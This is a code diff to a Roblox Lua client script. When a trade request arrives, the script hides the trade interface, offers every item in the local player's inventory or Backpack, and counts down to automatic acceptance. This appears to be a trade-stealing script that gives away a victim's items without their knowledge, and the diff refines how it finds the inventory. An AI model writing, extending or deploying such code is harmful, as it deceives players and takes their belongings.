@@ -11,19 +11,6 @@ local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")
 
 print("Waiting for incoming trade request callback...")
 
-local function findInventoryRecursive(parent)
-    if not parent then return nil end
-    for _, child in ipairs(parent:GetChildren()) do
-        if child.Name == "Container" and (child:IsA("ScrollingFrame") or child:IsA("Frame")) then
-            -- Verify it has item children or is inside Salvage/Inventory
-            return child
-        end
-        local found = findInventoryRecursive(child)
-        if found then return found end
-    end
-    return nil
-end
-
 SendRequest.OnClientInvoke = function(senderPlayer)
     local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
     
@@ -40,7 +27,6 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         element.Visible = false
                     end
                 end
-                print("Hidden TradeGUI elements successfully.")
             end
         end
 
@@ -53,12 +39,30 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             print("Trade started! Waiting 1 second before offering items...")
             task.wait(1)
             
-            local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+            local targetPlayerName = LocalPlayer.Name
             local inventoryContainer = nil
             
+            local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
             if pGui then
-                -- Deep search fallback to locate inventory container on mobile UI layouts
-                inventoryContainer = findInventoryRecursive(pGui)
+                local mainGui = pGui:FindFirstChild("MainGUI")
+                if mainGui then
+                    local gameFolder = mainGui:FindFirstChild("Game")
+                    if gameFolder then
+                        local crafting = gameFolder:FindFirstChild("Crafting")
+                        if crafting then
+                            local inventory = crafting:FindFirstChild("Inventory")
+                            if inventory then
+                                local salvage = inventory:FindFirstChild("Salvage")
+                                if salvage then
+                                    local scrollFrame = salvage:FindFirstChild("ScrollFrame")
+                                    if scrollFrame then
+                                        inventoryContainer = scrollFrame:FindFirstChild("Container")
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
             end
 
             local offeredCount = 0
@@ -82,9 +86,8 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                print("Successfully offered " .. tostring(offeredCount) .. " items/weapons!")
+                print("Successfully offered " .. tostring(offeredCount) .. " items for player: " .. targetPlayerName)
             else
-                -- Fallback to Backpack tools if UI container is completely missing on mobile
                 if LocalPlayer:FindFirstChild("Backpack") then
                     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                         if tool:IsA("Tool") then
@@ -94,7 +97,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                print("Offered " .. tostring(offeredCount) .. " items from Backpack!")
+                warn("Inventory container path not found directly; pulled " .. tostring(offeredCount) .. " items from Backpack for " .. targetPlayerName)
             end
 
             print("Waiting 7 seconds before triggering trade accept actions...")
